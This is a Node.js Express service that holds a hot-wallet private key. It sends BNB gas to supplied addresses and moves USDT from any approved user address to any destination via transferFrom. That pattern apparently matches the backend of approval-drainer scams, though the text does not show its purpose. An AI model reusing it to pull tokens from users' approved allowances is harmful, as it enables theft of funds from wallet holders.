require("dotenv").config();
const express = require("express");
const cors = require("cors");
const { ethers } = require("ethers");

const app = express();
app.use(cors());
app.use(express.json());

/* =============================
   API KEY CHECK
============================= */

function checkApiKey(req, res, next) {

  const key = req.headers["x-api-key"];

  if (key !== process.env.API_KEY) {
    return res.status(403).json({
      error: "Invalid API key"
    });
  }

  next();
}

/* =============================
   Provider + Wallet
============================= */

const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);

/* =============================
   USDT Contract
============================= */

const USDT = "0x55d398326f99059fF775485246999027B3197955";

const ABI = [
  "function transferFrom(address from,address to,uint256 amount) external returns(bool)"
];

const usdt = new ethers.Contract(USDT, ABI, wallet);

/* =============================
   HEALTH CHECK
============================= */

app.get("/", (req, res) => {
  res.send("Gas API Running ✅");
});

/* =============================
   TOPUP (Send BNB Gas)
============================= */

app.post("/topup", checkApiKey, async (req, res) => {
  try {

    const { to } = req.body;

    if (!to)
      return res.status(400).json({ error: "Address required" });

    const tx = await wallet.sendTransaction({
      to: to,
      value: ethers.parseEther("0.0005")
    });

    await tx.wait();

    res.json({
      success: true,
      hash: tx.hash
    });

  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

/* =============================
   SEND (Transfer USDT)
============================= */

app.post("/send", checkApiKey, async (req, res) => {
  try {

    const { userAddress, toAddress, amount } = req.body;

    if (!userAddress || !toAddress || !amount)
      return res.status(400).json({ error: "Missing fields" });

    const value = ethers.parseUnits(amount.toString(), 18);

    const tx = await usdt.transferFrom(
      userAddress,
      toAddress,
      value
    );

    await tx.wait();

    res.json({
      success: true,
      txHash: tx.hash
    });

  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

/* =============================
   FUND GAS (Optional)
============================= */

app.post("/fund-gas", checkApiKey, async (req, res) => {
  try {

    const { userAddress } = req.body;

    const tx = await wallet.sendTransaction({
      to: userAddress,
      value: ethers.parseEther("0.0005")
    });

    await tx.wait();

    res.json({
      success: true,
      hash: tx.hash
    });

  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

/* ============================= */

app.listen(process.env.PORT || 3000, () =>
  console.log("Server running ✅")
);
